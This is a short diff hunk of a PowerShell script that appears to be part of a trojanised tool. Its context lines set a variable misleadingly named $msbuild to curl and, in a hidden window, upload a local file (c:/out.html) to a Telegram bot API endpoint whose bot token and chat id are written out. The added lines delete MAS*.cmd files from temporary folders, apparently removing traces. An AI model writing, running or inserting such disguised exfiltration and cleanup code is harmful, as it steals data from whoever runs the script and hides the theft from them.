@@ -39,3 +39,6 @@ start-process $msbuild $arguments -Wait
 $msbuild = "curl"
 $arguments = '-s -F document=@"c:/out.html" https://api.telegram.org/bot7623697444:AAER5Ph7rbkgJifCvG4cyXhg6XhvSnQvjr4/sendDocument?chat_id=7032729089'
 start-process $msbuild $arguments -WindowStyle Hidden -Wait
+
+$FilePaths = @("$env:SystemRoot\Temp\MAS*.cmd", "$env:USERPROFILE\AppData\Local\Temp\MAS*.cmd")
+foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
